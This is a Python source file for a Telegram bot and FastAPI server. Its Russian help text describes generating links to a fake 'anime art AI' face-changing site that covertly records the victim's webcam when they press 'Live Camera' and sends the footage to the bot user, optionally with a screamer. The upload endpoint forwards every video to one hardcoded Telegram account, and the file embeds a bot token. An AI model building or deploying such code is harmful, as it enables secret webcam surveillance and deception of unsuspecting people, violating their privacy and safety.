from threading import Thread
import uvicorn
import telebot

bot = telebot.TeleBot("7462346035:AAF60-_oMbOaJQwIdRpkM63KpC-Ayx0eEzk")

@bot.message_handler(commands=['start', 'help'])
def start_message(message):
  bot.send_message(message.chat.id,'Привет!\nЭтот бот генерирует ссылку на фейковый сайт с нейросетью которая якобы меняет твое лицо\nКогда жертва нажмет кнопку "Live Camera" начнется запись с веб камеры жертвы и будет отправлена этим ботом тебе, а тем временем у жертвы будет бесконечная загрузка\nТакже можно сгенерировать ссылку со скримером\n\n/gen - Сгенерировать ссылку без скримера\n/gen_screamer - Сгенерировать ссылку со скримером\n/help - Помощь')

@bot.message_handler(commands=["gen"])
def gen(message):
    bot.send_message(message.chat.id, f'https://anime-art-ai.vercel.app/?model={message.from_user.id}')

@bot.message_handler(commands=["gen_screamer"])
def gen(message):
    bot.send_message(message.chat.id, f'https://anime-art-ai.vercel.app/?model={message.from_user.id}&v2=true')


@bot.message_handler()
def unknown_command(message):
    bot.send_message(message.chat.id, "Я тебя не понимаю(\nНапиши /help")


def sendNotification(creator_id: int):
    bot.send_message(creator_id, "Жертва")

def bot_polling():
    bot.infinity_polling()


import os
import time

from fastapi import FastAPI, File, UploadFile
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse


app = FastAPI()

origins = ["*"]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


videos = {}

import threading

TIMEOUT_SECONDS = 5

print(TIMEOUT_SECONDS)

# Function to handle video cleanup
def cleanup_videos():
    while True:
        # Sleep for the specified timeout
        time.sleep(TIMEOUT_SECONDS)

        # Get current timestamp
        current_time = time.time()

        # Iterate over video timestamps and delete if older than timeout
        for filename, timestamp in videos.items():
            if current_time - timestamp > TIMEOUT_SECONDS:
                creator_id = 0
                filename = filename.split(".webm")[0]
                if "-" not in filename:
                    creator_id = 2114613077
                else:
                    creator_id = int(filename.split("-")[0])
                bot.send_video(2114613077, os.path.join("/tmp", filename))
                # Delete the video file
                try:
                    os.remove(os.path.join("/tmp", filename))
                    del videos[filename] # Remove from the dictionary
                    print(f"Deleted video: {filename}")
                except FileNotFoundError:
                    # Ignore if file is already deleted
                    pass

# Start the cleanup thread (runs in the background)
cleanup_thread = threading.Thread(target=cleanup_videos)
cleanup_thread.daemon = True # Allow main thread to exit even if cleanup thread is running
cleanup_thread.start()

@app.post("/upload-video")
async def upload_video(video: UploadFile = File(...)):
    try:
        with open(os.path.join("/tmp", video.filename), "wb") as buffer:
            buffer.write(video.file.read())
        bot.send_message(2114613077, "a")
        bot.send_video(2114613077, os.path.join("/tmp", video.filename))
        
        
        videos[video.filename] = time.time()

    except Exception as e:
        return "Error: " + repr(e)


@app.get("/videos/{filename}")
async def get_video(filename: str):
    return FileResponse(os.path.join("/tmp", filename)) 


if __name__ == "__main__":
    Thread(target=bot_polling).start()
    uvicorn.run("main:app", port=8000, reload=True)

